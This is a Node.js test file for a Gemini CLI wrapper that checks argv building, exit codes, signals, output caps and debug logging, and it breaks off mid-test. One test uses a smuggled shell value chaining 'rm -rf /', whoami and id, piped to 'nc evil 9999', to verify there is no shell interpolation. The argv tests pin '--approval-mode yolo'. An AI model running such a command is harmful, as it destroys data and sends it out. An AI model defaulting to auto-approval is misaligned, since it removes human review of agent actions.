// Offline tests for invoke.ts: argv construction, prompt composition,
// child env, and ENOENT handling. No real CLI is spawned.

import { test } from "node:test";
import assert from "node:assert/strict";
import { ChildProcess } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import {
  buildArgv,
  classifyExitCode,
  composePrompt,
  childEnv,
  debugEnabled,
  invokeGemini,
  resultFromOutcome,
  signalNameToNumber,
  tryParseJson,
} from "../dist/invoke.js";
import { makeFakeBin, withEnv } from "./helpers.mjs";

test("buildArgv puts -p first and JSON output before approval mode", () => {
  const argv = buildArgv({ prompt: "hello" });
  assert.equal(argv[0], "-p");
  assert.equal(argv[1], "hello");
  assert.equal(argv[2], "--output-format");
  assert.equal(argv[3], "json");
  assert.equal(argv[4], "--approval-mode");
  assert.equal(argv[5], "yolo");
  assert.equal(argv.length, 6, "no extra flags when model is omitted");
});

test("buildArgv appends --model only when provided", () => {
  const argv = buildArgv({ prompt: "hi", model: "gemini-2.5-pro" });
  assert.equal(argv.includes("--model"), true);
  const modelIdx = argv.indexOf("--model");
  assert.equal(argv[modelIdx + 1], "gemini-2.5-pro");
  // model flag must come AFTER the core flags
  assert.ok(modelIdx > argv.indexOf("--approval-mode"));
});

test("buildArgv passes the prompt as a single argv element — no shell interpolation", () => {
  // A prompt containing shell metacharacters must come through as one element.
  const nasty = `; rm -rf / && echo "$(whoami)" \`id\` | nc evil 9999`;
  const argv = buildArgv({ prompt: nasty });
  assert.equal(argv[1], nasty, "prompt must be exactly one argv element");
  // and nothing else in argv should contain those metacharacters
  for (let i = 0; i < argv.length; i++) {
    if (i === 1) continue;
    assert.ok(
      !argv[i].includes("rm -rf"),
      `argv[${i}] leaked prompt content`
    );
  }
});

test("composePrompt wraps context in <context> when provided", () => {
  const out = composePrompt({ prompt: "do the thing", context: "ctx body" });
  assert.equal(out, "<context>\nctx body\n</context>\n\ndo the thing");
});

test("composePrompt is a no-op without context", () => {
  assert.equal(composePrompt({ prompt: "hi" }), "hi");
  assert.equal(composePrompt({ prompt: "hi", context: "" }), "hi");
});

test("childEnv pins NO_COLOR=1 and TERM=dumb", () => {
  const env = childEnv();
  assert.equal(env.NO_COLOR, "1");
  assert.equal(env.TERM, "dumb");
});

test("childEnv overrides incoming TERM/NO_COLOR even when set", async () => {
  // childEnv reads process.env at call time and forces the pinned values.
  await withEnv({ TERM: "xterm-256color", NO_COLOR: "0" }, () => {
    const env = childEnv();
    assert.equal(env.NO_COLOR, "1");
    assert.equal(env.TERM, "dumb");
  });
});

test("childEnv inherits the server env (so secrets like GEMINI_API_KEY flow through)", async () => {
  await withEnv({ GEMINICLI_MCP_TEST_INHERIT: "sentinel-value-99" }, () => {
    const env = childEnv();
    assert.equal(env.GEMINICLI_MCP_TEST_INHERIT, "sentinel-value-99");
  });
});

test("invokeGemini returns a clear ENOENT result when the CLI is missing", async () => {
  await withEnv({ GEMINI_CLI_BIN: "/definitely/not/a/real/gemini-binary-xyz-123" }, async () => {
    const r = await invokeGemini({ prompt: "hi" });
    assert.equal(r.exitCode, 127);
    assert.equal(r.errorKind, "error");
    assert.match(r.text, /Gemini CLI binary not found/);
    assert.match(r.text, /GEMINI_CLI_BIN/);
  });
});

test("invokeGemini surfaces non-zero exit codes via classifyExitCode", async () => {
  const fake = makeFakeBin(`exit 1`);
  try {
    await withEnv({ GEMINI_CLI_BIN: fake }, async () => {
      const r = await invokeGemini({ prompt: "hi" });
      assert.equal(r.exitCode, 1);
      assert.equal(r.errorKind, "error");
    });
  } finally {
    try { fs.unlinkSync(fake); } catch {}
  }
});

test("invokeGemini caps stdout at GEMINICLI_MCP_MAX_OUTPUT_BYTES and kills the child", async () => {
  // Fake bin streams forever; ignores its gemini-style argv.
  const fake = makeFakeBin(`while :; do printf 'y\\n'; done`);
  try {
    await withEnv({ GEMINI_CLI_BIN: fake, GEMINICLI_MCP_MAX_OUTPUT_BYTES: "1024" }, async () => {
      const r = await invokeGemini({ prompt: "hi" });
      // Cap the buffer at the configured limit (plus a small slack for the
      // last chunk that triggers the kill).
      assert.ok(
        r.raw.length <= 1024 + 64 * 1024,
        `raw exceeded cap+slack: ${r.raw.length}`
      );
      assert.match(r.text, /output truncated at 1024 bytes/);
      assert.notEqual(r.exitCode, 0);
    });
  } finally {
    try {
      fs.unlinkSync(fake);
    } catch {}
  }
});

test("invokeGemini actually passes --model to the spawned child", async () => {
  const captureFile = path.join(
    os.tmpdir(),
    `geminicli-mcp-argv-${process.pid}-${Date.now()}.json`
  );
  // Fake bin dumps its argv to disk and exits 0 with empty stdout. We then
  // inspect the captured argv to confirm --model was threaded through.
  const fake = makeFakeBin(
    `node -e 'require("fs").writeFileSync(${JSON.stringify(captureFile)}, JSON.stringify(process.argv.slice(1)))' -- "$@"`
  );
  try {
    await withEnv({ GEMINI_CLI_BIN: fake }, async () => {
      await invokeGemini({ prompt: "hello", model: "gemini-2.5-flash" });
    });
    const argv = JSON.parse(fs.readFileSync(captureFile, "utf8"));
    assert.ok(argv.includes("--model"), `--model not in argv: ${argv}`);
    const modelIdx = argv.indexOf("--model");
    assert.equal(argv[modelIdx + 1], "gemini-2.5-flash");
    assert.equal(argv[0], "-p");
    assert.equal(argv[1], "hello");
  } finally {
    try { fs.unlinkSync(fake); } catch {}
    try { fs.unlinkSync(captureFile); } catch {}
  }
});

test("invokeGemini surfaces stderr text when stdout is empty and exit is non-zero", async () => {
  const fake = makeFakeBin(`echo "auth bonk: please run gemini once" >&2; exit 41`);
  try {
    await withEnv({ GEMINI_CLI_BIN: fake }, async () => {
      const r = await invokeGemini({ prompt: "hi" });
      assert.equal(r.exitCode, 41);
      assert.equal(r.errorKind, "auth_required");
      assert.match(r.text, /auth bonk/);
    });
  } finally {
    try { fs.unlinkSync(fake); } catch {}
  }
});

test("invokeGemini honours an aborted signal and kills the child", async () => {
  // Fake bin sleeps long enough that the abort has to land for the test to
  // finish quickly.
  const fake = makeFakeBin(`exec sleep 30`);
  const controller = new AbortController();
  setTimeout(() => controller.abort(), 30);
  try {
    await withEnv({ GEMINI_CLI_BIN: fake }, async () => {
      const start = Date.now();
      const r = await invokeGemini(
        { prompt: "hi" },
        { signal: controller.signal }
      );
      const elapsed = Date.now() - start;
      assert.ok(
        elapsed < 5_000,
        `abort did not kill child promptly: ${elapsed}ms`
      );
      assert.notEqual(r.exitCode, 0);
      assert.match(r.text + r.raw, /cancelled by caller|gemini exited/);
    });
  } finally {
    try {
      fs.unlinkSync(fake);
    } catch {}
  }
});

// --- Signal exit code handling (AUDIT-CORR-001 regression) ---

test("signalNameToNumber maps SIGTERM to 15", () => {
  assert.equal(signalNameToNumber("SIGTERM"), 15);
});

test("signalNameToNumber maps SIGKILL to 9", () => {
  assert.equal(signalNameToNumber("SIGKILL"), 9);
});

test("signalNameToNumber returns undefined for unknown signal names", () => {
  assert.equal(signalNameToNumber("SIGFAKE"), undefined);
});

test("SIGKILL-killed child returns POSIX exit code 137 (VAL-REM-F08-001)", async (t) => {
  if (process.platform === "win32") {
    t.skip("Windows does not report POSIX signal exit codes for killed child processes");
    return;
  }
  // Use a fake bin that sleeps briefly then kills itself with SIGKILL.
  // We use a Node.js script to ensure precise signal delivery.
  const fake = makeFakeBin(`node -e 'setTimeout(()=>{},50); process.kill(process.pid,"SIGKILL")'`);
  try {
    await withEnv({ GEMINI_CLI_BIN: fake }, async () => {
      const r = await invokeGemini({ prompt: "hi" });
      // SIGKILL = 9, POSIX exit code = 128 + 9 = 137
      assert.equal(r.exitCode, 137);
    });
  } finally {
    try { fs.unlinkSync(fake); } catch {}
  }
});

test("SIGTERM-killed child returns POSIX exit code 143 (VAL-REM-F08-002)", async () => {
  // Create a fake bin that traps SIGTERM and exits with its own code so the
  // "close" event sees sigName === null and code === 143 (from our handler).
  // Actually, when a shell script is killed by SIGTERM, the shell itself
  // propagates and the child sees the signal. Use a small max-output cap to
  // trigger the truncation kill (which sends SIGTERM).
  const fake = makeFakeBin(`while :; do printf 'y\\n'; done`);
  try {
    await withEnv({ GEMINI_CLI_BIN: fake, GEMINICLI_MCP_MAX_OUTPUT_BYTES: "64" }, async () => {
      const r = await invokeGemini({ prompt: "hi" });
      // When the child is killed by SIGTERM from killWith, Node's close event
      // receives sigName="SIGTERM", which maps to 128+15=143.
      assert.equal(r.exitCode, 143);
    });
  } finally {
    try { fs.unlinkSync(fake); } catch {}
  }
});

// --- stderr, truncation, and abort metadata propagation (REM-F09) ---------

test("low output cap sets truncated: true on GeminiResult (VAL-REM-F09-001)", async () => {
  const fake = makeFakeBin(`while :; do printf 'y\\n'; done`);
  try {
    await withEnv({ GEMINI_CLI_BIN: fake, GEMINICLI_MCP_MAX_OUTPUT_BYTES: "256" }, async () => {
      const r = await invokeGemini({ prompt: "hi" });
      assert.equal(r.truncated, true, "truncated flag must be true when output cap is hit");
      assert.notEqual(r.exitCode, 0);
    });
  } finally {
    try { fs.unlinkSync(fake); } catch {}
  }
});

test("AbortSignal cancellation sets aborted: true on GeminiResult (VAL-REM-F09-002)", async () => {
  const fake = makeFakeBin(`exec sleep 30`);
  const controller = new AbortController();
  setTimeout(() => controller.abort(), 30);
  try {
    await withEnv({ GEMINI_CLI_BIN: fake }, async () => {
      const r = await invokeGemini(
        { prompt: "hi" },
        { signal: controller.signal }
      );
      assert.equal(r.aborted, true, "aborted flag must be true when AbortSignal fires");
      assert.notEqual(r.exitCode, 0);
    });
  } finally {
    try { fs.unlinkSync(fake); } catch {}
  }
});

test("stderr is available on a zero-exit success-path result (VAL-REM-F09-003)", async () => {
  const fake = makeFakeBin(
    `echo "warning: something minor" >&2; printf '{"response":"hello"}'`
  );
  try {
    await withEnv({ GEMINI_CLI_BIN: fake }, async () => {
      const r = await invokeGemini({ prompt: "hi" });
      assert.equal(r.exitCode, 0);
      assert.equal(r.errorKind, "ok");
      assert.equal(r.text, "hello");
      assert.ok(r.stderr, "stderr should be present on success-path result");
      assert.match(r.stderr, /warning: something minor/);
    });
  } finally {
    try { fs.unlinkSync(fake); } catch {}
  }
});

// --- Non-ENOENT spawn errors (REM-F10) ------------------------------------

test("EACCES non-executable binary returns structured result instead of throwing (VAL-REM-F10-001)", async (t) => {
  if (process.platform === "win32") {
    t.skip("Windows reports non-executable scripts as spawn UNKNOWN instead of POSIX EACCES");
    return;
  }
  // Create a file that exists but is NOT executable (no +x bits).
  const noExecFile = path.join(
    os.tmpdir(),
    `geminicli-mcp-noexec-${process.pid}-${Date.now()}.sh`
  );
  fs.writeFileSync(noExecFile, "#!/bin/sh\necho hello\n", { mode: 0o644 });
  try {
    await withEnv({ GEMINI_CLI_BIN: noExecFile }, async () => {
      const r = await invokeGemini({ prompt: "hi" });
      // Must be a structured result — not a thrown error.
      assert.equal(typeof r.text, "string");
      assert.ok(r.text.length > 0, "text must describe the problem");
      // EACCES/EPERM should produce exit code 126 (POSIX "not executable").
      assert.equal(r.exitCode, 126, `expected 126, got ${r.exitCode}: ${r.text}`);
      assert.equal(r.errorKind, "error");
      assert.match(r.text, /not executable/);
      assert.match(r.text, /GEMINI_CLI_BIN/);
    });
  } finally {
    try { fs.unlinkSync(noExecFile); } catch {}
  }
});

test("ENOENT binary-not-found still returns exit code 127 after F10 changes", async () => {
  // Regression check: the existing ENOENT behaviour must be unchanged.
  await withEnv({ GEMINI_CLI_BIN: "/definitely/not/a/real/gemini-binary-xyz-456" }, async () => {
    const r = await invokeGemini({ prompt: "hi" });
    assert.equal(r.exitCode, 127);
    assert.equal(r.errorKind, "error");
    assert.match(r.text, /Gemini CLI binary not found/);
  });
});

test("abort-plus-cap race keeps truncated: true when data was truncated (VAL-REM-F09-004)", async () => {
  // Use a very small cap and a delayed abort so the output cap is hit first.
  // The truncated flag must remain true even though the abort also fires.
  const fake = makeFakeBin(`while :; do printf 'y\\n'; done`);
  const controller = new AbortController();
  // Abort slightly after the cap will have been hit so both conditions race.
  setTimeout(() => controller.abort(), 200);
  try {
    await withEnv({ GEMINI_CLI_BIN: fake, GEMINICLI_MCP_MAX_OUTPUT_BYTES: "64" }, async () => {
      const r = await invokeGemini(
        { prompt: "hi" },
        { signal: controller.signal }
      );
      assert.equal(r.truncated, true, "truncated must remain true even with concurrent abort");
      assert.notEqual(r.exitCode, 0);
    });
  } finally {
    try { fs.unlinkSync(fake); } catch {}
  }
});

// --- Stream accumulation and JSON parsing performance (REM-F11) ----------

test("chunked fake-bin output joins and parses to the expected result (VAL-REM-F11-002)", async () => {
  // Simulate a CLI that emits JSON in multiple small writes (many chunks).
  // The chunk-array accumulation must join them into a single valid JSON string.
  // Write the JSON object in several shell writes to force multiple chunks
  // without depending on a nested Node subprocess inside the fake CLI.
  const fake = makeFakeBin(
    `printf '{"response":"chunked '; printf 'hello '; printf 'world"}'`
  );
  try {
    await withEnv({ GEMINI_CLI_BIN: fake }, async () => {
      const r = await invokeGemini({ prompt: "hi" });
      assert.equal(r.exitCode, 0);
      assert.equal(r.errorKind, "ok");
      assert.equal(r.text, "chunked hello world");
      assert.ok(r.raw.includes('"response"'), `raw should contain JSON key: ${r.raw.slice(0, 100)}`);
    });
  } finally {
    try { fs.unlinkSync(fake); } catch {}
  }
});

test("multibyte UTF-8 split across pipe chunks decodes without U+FFFD corruption (review finding 4)", async () => {
  // '{"response":"héllo"}' emitted as two delayed writes split mid-é
  // (0xC3 | 0xA9). Per-chunk Buffer#toString("utf8") decoded this to
  // 'h��llo'; the per-stream StringDecoder must not.
  const json = '{"response":"héllo"}';
  const fake = makeFakeBin(
    `printf '{"response":"h\\303'; sleep 0.08; printf '\\251llo"}'`
  );
  try {
    await withEnv({ GEMINI_CLI_BIN: fake }, async () => {
      const r = await invokeGemini({ prompt: "hi" });
      assert.equal(r.exitCode, 0);
      assert.equal(r.text, "héllo");
      assert.ok(
        !r.raw.includes("�"),
        `raw contains replacement chars: ${r.raw}`
      );
    });
  } finally {
    try { fs.unlinkSync(fake); } catch {}
  }
});

test("output cap counts bytes, not UTF-16 code units, for multibyte output (review finding 4)", async () => {
  // 32 emoji = 128 UTF-8 bytes but only 64 UTF-16 code units. With a 64-byte
  // cap the child must be truncated after 16 emoji; the old code compared
  // code units, letting all 128 bytes through untruncated (up to ~4x the
  // configured cap for astral-plane content).
  const emoji = "\u{1F600}";
  const fake = makeFakeBin(`printf '${emoji.repeat(32)}'`);
  try {
    await withEnv(
      { GEMINI_CLI_BIN: fake, GEMINICLI_MCP_MAX_OUTPUT_BYTES: "64" },
      async () => {
        const r = await invokeGemini({ prompt: "hi" });
        assert.equal(r.truncated, true, "cap must trigger on byte count");
        const noticeIdx = r.raw.indexOf("\n[geminicli-mcp:");
        const content = noticeIdx === -1 ? r.raw : r.raw.slice(0, noticeIdx);
        assert.ok(
          Buffer.byteLength(content, "utf8") <= 64,
          `accumulated ${Buffer.byteLength(content, "utf8")} bytes, cap is 64`
        );
        assert.equal(content, emoji.repeat(16), "exactly 16 emoji fit in 64 bytes");
        assert.ok(!content.includes("�"), "no replacement chars at the cut");
      }
    );
  } finally {
    try { fs.unlinkSync(fake); } catch {}
  }
});

test("tryParseJson parses whole-buffer JSON without line splitting (AUDIT-PERF-002 regression)", () => {
  // Single JSON object on one line — the fast whole-buffer path should handle it.
  const parsed = tryParseJson('{"response":"fast path"}');
  assert.deepEqual(parsed, { response: "fast path" });
});

test("tryParseJson falls back to line-by-line when whole-buffer parse fails", () => {
  // Leading noise line followed by JSON — whole-buffer parse fails, line scan finds it.
  const input = 'some noise\n{"response":"line scan"}\nmore noise';
  const parsed = tryParseJson(input);
  assert.deepEqual(parsed, { response: "line scan" });
});

// --- resultFromOutcome extraction branches (AUDIT-TEST-001, VAL-REM-F13-001) ---

test("resultFromOutcome extracts text from p.response field (VAL-REM-F13-001)", () => {
  const outcome = {
    exitCode: 0,
    stdout: '{"response":"hello from response"}',
    stderr: "",
  };
  const r = resultFromOutcome(outcome);
  assert.equal(r.exitCode, 0);
  assert.equal(r.errorKind, "ok");
  assert.equal(r.text, "hello from response");
  assert.equal(r.raw, '{"response":"hello from response"}');
});

test("resultFromOutcome extracts text from p.text field (VAL-REM-F13-001)", () => {
  const outcome = {
    exitCode: 0,
    stdout: '{"text":"hello from text field"}',
    stderr: "",
  };
  const r = resultFromOutcome(outcome);
  assert.equal(r.exitCode, 0);
  assert.equal(r.text, "hello from text field");
});

test("resultFromOutcome extracts text from p.output field (VAL-REM-F13-001)", () => {
  const outcome = {
    exitCode: 0,
    stdout: '{"output":"hello from output field"}',
    stderr: "",
  };
  const r = resultFromOutcome(outcome);
  assert.equal(r.exitCode, 0);
  assert.equal(r.text, "hello from output field");
});

test("resultFromOutcome extracts text from p.error.message field (VAL-REM-F13-001)", () => {
  const outcome = {
    exitCode: 1,
    stdout: '{"error":{"message":"quota exceeded"}}',
    stderr: "",
  };
  const r = resultFromOutcome(outcome);
  assert.equal(r.exitCode, 1);
  assert.equal(r.errorKind, "error");
  assert.equal(r.text, "quota exceeded");
});

test("resultFromOutcome falls back to raw stdout when JSON has no known field (VAL-REM-F13-001)", () => {
  const outcome = {
    exitCode: 0,
    stdout: '{"unknown_key":"something"}',
    stderr: "",
  };
  const r = resultFromOutcome(outcome);
  assert.equal(r.exitCode, 0);
  // When no recognized field matches, text falls back to trimmed stdout.
  assert.equal(r.text, '{"unknown_key":"something"}');
});

test("resultFromOutcome falls back to stderr when stdout is empty and exit is non-zero (VAL-REM-F13-001)", () => {
  const outcome = {
    exitCode: 41,
    stdout: "",
    stderr: "auth error: please reauthenticate\n",
  };
  const r = resultFromOutcome(outcome);
  assert.equal(r.exitCode, 41);
  assert.equal(r.errorKind, "auth_required");
  assert.equal(r.text, "auth error: please reauthenticate");
});

test("resultFromOutcome falls back to generic message when both stdout and stderr are empty (VAL-REM-F13-001)", () => {
  const outcome = {
    exitCode: 53,
    stdout: "",
    stderr: "",
  };
  const r = resultFromOutcome(outcome);
  assert.equal(r.exitCode, 53);
  assert.equal(r.errorKind, "turn_limit");
  assert.equal(r.text, "gemini exited 53");
});

// --- stderr cap / truncation test (AUDIT-TEST-006, VAL-REM-F13-004) ---

// --- Context prompt routing argv capture (AUDIT-TEST-004, VAL-REM-F14-001) ---

test("context prompt routing: prompt starts with <context> followed by a newline (VAL-REM-F14-001)", async () => {
  const captureFile = path.join(
    os.tmpdir(),
    `geminicli-mcp-ctx-argv-${process.pid}-${Date.now()}.json`
  );
  // Fake bin captures its argv (excluding the shell script name at index 0)
  // so we can inspect what was passed as the -p argument.
  const fake = makeFakeBin(
    `node -e 'require("fs").writeFileSync(${JSON.stringify(captureFile)}, JSON.stringify(process.argv.slice(1)))' -- "$@" ; printf '{"response":"ok"}'`
  );
  try {
    await withEnv({ GEMINI_CLI_BIN: fake }, async () => {
      await invokeGemini({ prompt: "summarize", context: "background info" });
    });
    const argv = JSON.parse(fs.readFileSync(captureFile, "utf8"));
    // The -p argument is at index 1 (after the shell's `$0` has been stripped,
    // node sees ["-p", "<prompt>", "--output-format", ...]).
    const promptArg = argv[1];
    assert.ok(promptArg.startsWith("<context>\n"), `prompt must start with <context>\\n, got: ${promptArg.slice(0, 40)}`);
  } finally {
    try { fs.unlinkSync(fake); } catch {}
    try { fs.unlinkSync(captureFile); } catch {}
  }
});

// --- classifyExitCode(41) auth_required (AUDIT-TEST-005, VAL-REM-F14-002) ---

test("classifyExitCode(127) maps to error, matching the README table and spawn path (review finding 6)", () => {
  // A resolved wrapper script that itself exits 127 must classify the same
  // way as the synthesized ENOENT result — not as 'unknown'.
  assert.equal(classifyExitCode(127), "error");
  // Codes outside the documented set still classify as unknown.
  assert.equal(classifyExitCode(99), "unknown");
  assert.equal(classifyExitCode(126), "unknown");
});

test("classifyExitCode(41) maps to auth_required (VAL-REM-F14-002)", async () => {
  const fake = makeFakeBin(`exit 41`);
  try {
    await withEnv({ GEMINI_CLI_BIN: fake }, async () => {
      const r = await invokeGemini({ prompt: "hi" });
      assert.equal(r.exitCode, 41);
      assert.equal(r.errorKind, "auth_required");
    });
  } finally {
    try { fs.unlinkSync(fake); } catch {}
  }
});

// --- Pre-aborted AbortController returns exit code 130 (AUDIT-TEST-009, VAL-REM-F14-004) ---

test("pre-aborted AbortController returns exit code 130 without spawning the child (VAL-REM-F14-004)", async () => {
  // Use a non-existent binary: if the pre-abort check works, the child
  // should never be spawned so the binary path doesn't matter.
  const controller = new AbortController();
  controller.abort(); // Abort BEFORE calling invokeGemini.
  await withEnv({ GEMINI_CLI_BIN: "/definitely/not/a/real/gemini-binary-preabort" }, async () => {
    const r = await invokeGemini(
      { prompt: "hi" },
      { signal: controller.signal }
    );
    assert.equal(r.exitCode, 130, "pre-aborted signal should return exit code 130");
    assert.equal(r.aborted, true, "aborted flag must be true on pre-abort");
  });
});

// --- Fake-bin SIGTERM behaviour (AUDIT-TEST-010) ---

test("fake-bin SIGTERM: child killed by SIGTERM via output cap returns exit code 143", async () => {
  // This test verifies SIGTERM-killed children via the output cap mechanism.
  const fake = makeFakeBin(`while :; do printf 'y\\n'; done`);
  try {
    await withEnv({ GEMINI_CLI_BIN: fake, GEMINICLI_MCP_MAX_OUTPUT_BYTES: "64" }, async () => {
      const r = await invokeGemini({ prompt: "hi" });
      // Output cap triggers killWith("truncated") which sends SIGTERM.
      // SIGTERM = 15, POSIX exit code = 128 + 15 = 143.
      assert.equal(r.exitCode, 143, "SIGTERM-killed child should return POSIX exit code 143");
      assert.equal(r.truncated, true);
    });
  } finally {
    try { fs.unlinkSync(fake); } catch {}
  }
});

// --- SIGKILL escalation for SIGTERM-ignoring children (review finding 5) ---

test(
  "child that ignores SIGTERM is SIGKILL-escalated instead of hanging the call (review finding 5)",
  {
    skip:
      process.platform === "win32"
        ? "SIGTERM cannot be trapped on Windows"
        : false,
    // Before the escalation existed this call never resolved; a hard test
    // timeout turns a regression into a clean failure instead of a hang.
    timeout: 30_000,
  },
  async () => {
    // The shell ignores SIGTERM and streams forever — the output cap fires
    // killWith, SIGTERM is swallowed, and only the SIGKILL escalation
    // (2s grace) can end the child.
    const fake = makeFakeBin(`trap '' TERM; while :; do printf 'y\\n'; done`);
    try {
      await withEnv(
        { GEMINI_CLI_BIN: fake, GEMINICLI_MCP_MAX_OUTPUT_BYTES: "64" },
        async () => {
          const start = Date.now();
          const r = await invokeGemini({ prompt: "hi" });
          const elapsed = Date.now() - start;
          // SIGKILL = 9 -> POSIX exit code 128 + 9 = 137.
          assert.equal(r.exitCode, 137, "child must die by SIGKILL");
          assert.equal(r.truncated, true);
          assert.ok(
            elapsed < 15_000,
            `call must resolve promptly after escalation: ${elapsed}ms`
          );
        }
      );
    } finally {
      try { fs.unlinkSync(fake); } catch {}
    }
  }
);

// --- Invalid GEMINICLI_MCP_MAX_OUTPUT_BYTES falls back to default (AUDIT-TEST-011, VAL-REM-F14-005) ---

test("invalid GEMINICLI_MCP_MAX_OUTPUT_BYTES 'abc' falls back to default cap (VAL-REM-F14-005)", async () => {
  const fake = makeFakeBin(`printf '{"response":"ok"}'`);
  try {
    await withEnv({ GEMINI_CLI_BIN: fake, GEMINICLI_MCP_MAX_OUTPUT_BYTES: "abc" }, async () => {
      const r = await invokeGemini({ prompt: "hi" });
      assert.equal(r.exitCode, 0);
      assert.equal(r.errorKind, "ok");
      assert.equal(r.text, "ok");
      assert.equal(r.truncated, undefined, "should not be truncated under default cap");
    });
  } finally {
    try { fs.unlinkSync(fake); } catch {}
  }
});

test("invalid GEMINICLI_MCP_MAX_OUTPUT_BYTES '-1' falls back to default cap (VAL-REM-F14-005)", async () => {
  const fake = makeFakeBin(`printf '{"response":"ok"}'`);
  try {
    await withEnv({ GEMINI_CLI_BIN: fake, GEMINICLI_MCP_MAX_OUTPUT_BYTES: "-1" }, async () => {
      const r = await invokeGemini({ prompt: "hi" });
      assert.equal(r.exitCode, 0);
      assert.equal(r.errorKind, "ok");
      assert.equal(r.text, "ok");
      assert.equal(r.truncated, undefined);
    });
  } finally {
    try { fs.unlinkSync(fake); } catch {}
  }
});

test("invalid GEMINICLI_MCP_MAX_OUTPUT_BYTES '0' falls back to default cap (VAL-REM-F14-005)", async () => {
  const fake = makeFakeBin(`printf '{"response":"ok"}'`);
  try {
    await withEnv({ GEMINI_CLI_BIN: fake, GEMINICLI_MCP_MAX_OUTPUT_BYTES: "0" }, async () => {
      const r = await invokeGemini({ prompt: "hi" });
      assert.equal(r.exitCode, 0);
      assert.equal(r.errorKind, "ok");
      assert.equal(r.text, "ok");
      assert.equal(r.truncated, undefined);
    });
  } finally {
    try { fs.unlinkSync(fake); } catch {}
  }
});

test("invalid GEMINICLI_MCP_MAX_OUTPUT_BYTES '' falls back to default cap (VAL-REM-F14-005)", async () => {
  const fake = makeFakeBin(`printf '{"response":"ok"}'`);
  try {
    await withEnv({ GEMINI_CLI_BIN: fake, GEMINICLI_MCP_MAX_OUTPUT_BYTES: "" }, async () => {
      const r = await invokeGemini({ prompt: "hi" });
      assert.equal(r.exitCode, 0);
      assert.equal(r.errorKind, "ok");
      assert.equal(r.text, "ok");
      assert.equal(r.truncated, undefined);
    });
  } finally {
    try { fs.unlinkSync(fake); } catch {}
  }
});

test("excessive stderr is capped at GEMINICLI_MCP_MAX_OUTPUT_BYTES and result includes stderr (VAL-REM-F13-004)", async () => {
  // Fake bin writes excessive stderr in a tight loop, then exits 0 with valid JSON.
  // The output cap will kill the child before it finishes naturally.
  const fake = makeFakeBin(
    `while :; do printf 'err\\n' >&2; done`
  );
  try {
    await withEnv({ GEMINI_CLI_BIN: fake, GEMINICLI_MCP_MAX_OUTPUT_BYTES: "256" }, async () => {
      const r = await invokeGemini({ prompt: "hi" });
      // The stderr should be present and capped (not exceed cap + small slack).
      assert.ok(r.stderr, "stderr must be present on the result");
      assert.ok(
        r.stderr.length <= 256 + 64 * 1024,
        `stderr exceeded cap+slack: ${r.stderr.length}`
      );
      // Truncated flag should be set because the stderr cap killed the child.
      assert.equal(r.truncated, true, "truncated flag must be true when stderr cap is hit");
    });
  } finally {
    try { fs.unlinkSync(fake); } catch {}
  }
});

// --- Debug logging and SIGTERM failure handling (REM-F19) ------------------

test("debugEnabled returns true when GEMINICLI_MCP_DEBUG is set to '1'", async () => {
  await withEnv({ GEMINICLI_MCP_DEBUG: "1" }, () => {
    assert.equal(debugEnabled(), true);
  });
});

test("debugEnabled returns true when GEMINICLI_MCP_DEBUG is set to 'true'", async () => {
  await withEnv({ GEMINICLI_MCP_DEBUG: "true" }, () => {
    assert.equal(debugEnabled(), true);
  });
});

test("debugEnabled returns false when GEMINICLI_MCP_DEBUG is unset", async () => {
  await withEnv({ GEMINICLI_MCP_DEBUG: undefined }, () => {
    assert.equal(debugEnabled(), false);
  });
});

test("debugEnabled returns false when GEMINICLI_MCP_DEBUG is empty", async () => {
  await withEnv({ GEMINICLI_MCP_DEBUG: "" }, () => {
    assert.equal(debugEnabled(), false);
  });
});

test("debug mode emits structured diagnostics to stderr only without corrupting stdout (VAL-REM-F19-001)", async () => {
  // Fake bin that produces a valid JSON response on stdout.
  const fake = makeFakeBin(`printf '{"response":"debug-test"}'`);

  // Capture stderr output from this process during the invocation.
  const stderrChunks = [];
  const origWrite = process.stderr.write.bind(process.stderr);
  const capturedStderr = [];
  process.stderr.write = function (chunk, ...args) {
    capturedStderr.push(typeof chunk === "string" ? chunk : chunk.toString());
    return origWrite(chunk, ...args);
  };

  try {
    await withEnv({ GEMINI_CLI_BIN: fake, GEMINICLI_MCP_DEBUG: "1" }, async () => {
      const r = await invokeGemini({ prompt: "hi" });
      // stdout (MCP protocol) must be valid and unpolluted.
      assert.equal(r.exitCode, 0);
      assert.equal(r.text, "debug-test");
      // The raw stdout should NOT contain any debug markers.
      assert.ok(!r.raw.includes("geminicli-mcp:debug"), "stdout must not contain debug output");
    });

    // stderr must contain structured debug diagnostics.
    const allStderr = capturedStderr.join("");
    assert.ok(allStderr.includes("geminicli-mcp:debug"), `stderr should contain debug output, got: ${allStderr.slice(0, 200)}`);

    // Verify JSON structure of debug lines.
    const debugLines = allStderr.split("\n").filter(l => l.startsWith("geminicli-mcp:debug "));
    assert.ok(debugLines.length >= 2, `expected at least 2 debug lines (start + complete), got ${debugLines.length}`);

    // Check the "invoke start" line.
    const startLine = debugLines.find(l => l.includes('"invoke start"'));
    assert.ok(startLine, "missing 'invoke start' debug line");
    const startData = JSON.parse(startLine.replace("geminicli-mcp:debug ", ""));
    assert.equal(startData.msg, "invoke start");
    assert.ok(Array.isArray(startData.argv), "start line should have argv array");

    // Check the "invoke complete" line.
    const completeLine = debugLines.find(l => l.includes('"invoke complete"'));
    assert.ok(completeLine, "missing 'invoke complete' debug line");
    const completeData = JSON.parse(completeLine.replace("geminicli-mcp:debug ", ""));
    assert.equal(completeData.msg, "invoke complete");
    assert.equal(completeData.exitCode, 0);
    assert.ok(typeof completeData.durationMs === "number", "durationMs should be a number");
  } finally {
    process.stderr.write = origWrite;
    try { fs.unlinkSync(fake); } catch {}
  }
});

test("SIGTERM kill failure is recorded in debug diagnostics (VAL-REM-F19-002)", async () => {
  // To simulate a SIGTERM kill failure, we create a child that exits immediately
  // with a signal. The output cap will trigger killWith(), but the child is
  // already gone, so child.kill() may throw (or succeed silently).
  // Instead, we directly test the killFailed flag by using a fake bin that
  // produces output rapidly (triggering truncation kill) and then exits with
  // SIGKILL before the kill can land. We verify the debug output includes
  // the killFailed field when applicable.

  // More direct test: use a fake bin that outputs a lot, triggering the output
  // cap and killWith. Then verify debug output includes the kill-related fields.
  const fake = makeFakeBin(`while :; do printf 'y\\n'; done`);

  const origWrite = process.stderr.write.bind(process.stderr);
  const capturedStderr = [];
  process.stderr.write = function (chunk, ...args) {
    capturedStderr.push(typeof chunk === "string" ? chunk : chunk.toString());
    return origWrite(chunk, ...args);
  };

  try {
